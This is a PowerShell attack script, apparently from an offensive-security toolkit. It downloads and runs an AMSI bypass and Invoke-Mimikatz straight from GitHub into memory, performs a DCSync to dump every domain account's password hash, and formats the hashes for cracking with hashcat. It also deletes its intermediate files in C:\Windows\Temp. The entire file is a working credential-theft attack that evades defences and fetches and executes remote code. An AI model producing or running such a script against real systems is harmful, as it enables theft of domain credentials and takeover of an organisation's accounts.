Function Invoke-DCSyncTH {

param (
    [string]$Domain = $env:USERDNSDOMAIN
)

IEX(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/The-Viper-One/Simple-AMSI-Bypass/main/Simple-Amsi-Bypass.ps1')

$PATH = "C:\Windows\Temp\"
$LOGFILE = $PATH + "Log.txt"
$HASHES = $PATH  + "Hashes.txt"
$USERS = $PATH + "Users.txt"
$HASHCATFILE = $PATH +"Hashcat.txt"

Write-Host "[-] Downloading Mimikatz into Memory" -ForegroundColor Cyan
IEX(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1')

Write-Host "[-] DCSync will be executed again the Domain: $Domain" -ForegroundColor Cyan

Write-Host "[!] Executing Mimikatz" -ForegroundColor Yellow
$Command = '"log ' + $LOGFILE + '" "lsadump::dcsync /domain:'+ $domain +' /all /csv"'
Invoke-Mimikatz -Command $Command | Out-Null
(Get-Content -LiteralPath $LOGFILE) -notmatch '\$' | ForEach-Object {$_.Split("`t")[2]} > $HASHES
(Get-Content -LiteralPath $LOGFILE) -notmatch '\$' | ForEach-Object {$_.Split("`t")[1]} > $USERS

Remove-Item $HASHCATFILE -Force | Out-Null
Start-Sleep -Seconds "3"

$File1 = Get-Content $USERS
$File2 = Get-Content $HASHES
for($i = 0; $i -lt $File1.Count; $i++)
{
    ('{0},{1}' -f $File1[$i],$File2[$i]) | Add-Content $HASHCATFILE -Force
}

Remove-Item -Path $LOGFILE
Remove-Item -Path $HASHES
Remove-Item -Path $USERS     

$Lines = Get-Content -Path $HASHCATFILE
$lineCount = ($Lines | Measure-Object -Line).Lines
Write-Host "[+] A total of [$lineCount] hashes have been extracted" -ForegroundColor Green
Write-Host ""

$file_content = Get-Content -Path $HASHCATFILE
foreach ($line in $file_content) {
    $new_line = $line -replace ",", "::aad3b435b51404eeaad3b435b51404ee:"
    $new_line += ":::"
    Write-Output $new_line
}



Write-Host ""

}

Invoke-DCSyncTH
